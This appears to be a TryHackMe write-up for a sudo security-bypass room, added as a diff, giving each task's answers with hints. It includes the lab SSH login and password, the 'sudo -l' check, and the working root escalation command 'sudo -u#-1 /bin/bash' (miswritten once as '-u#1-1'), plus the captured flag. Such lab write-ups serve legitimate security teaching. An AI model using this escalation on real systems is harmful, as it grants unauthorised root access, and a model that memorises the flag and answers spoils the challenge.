@@ -1,0 +1,35 @@
+#### Link to room: https://tryhackme.com/room/sudovulnsbypass
+
+#### [Task 1] Deploy!
+   1. No answer needed
+
+#### [Task 2] Security Bypass
+   1. /bin/bash
+> Hint: 
+>
+> SSH in with the following command: "ssh -p 2222 tryhackme@\<GIVEN-IP-ADDRESS\>"
+>
+> Enter "Yes" to continue and enter the password "tryhackme"
+>
+> You should now see that we are now "tryhackme@sudo-privesc:~$"
+>
+> If you type the command "sudo -l", we are able to see which commands the tryhackme user is able to run as root
+>
+> You should be able to see: "User tryhackme may run the following commands on sudo-privesc: | (ALL, !root) NOPASSWD: /bin/bash"
+>
+> This means we can run a bash shell as any other user - apart from root
+
+   2. THM{l33t_s3cur1ty_bypass}
+> Hint:
+>
+> If we enter the following command: "sudo -u#-1 /bin/bash" 
+>
+> sudo = because we want to be able to run as the root user 
+>
+> -u#1-1 = the vulnerability that allows us to be the root user 
+>
+> /bin/bash = the command that we found out earlier that we are able to run
+>
+> Once we issue that command, we can see that we are now: "root@sudo-privesc:~#"
+>
+> If you type the command "cat /root/root.txt", you will see the answer 
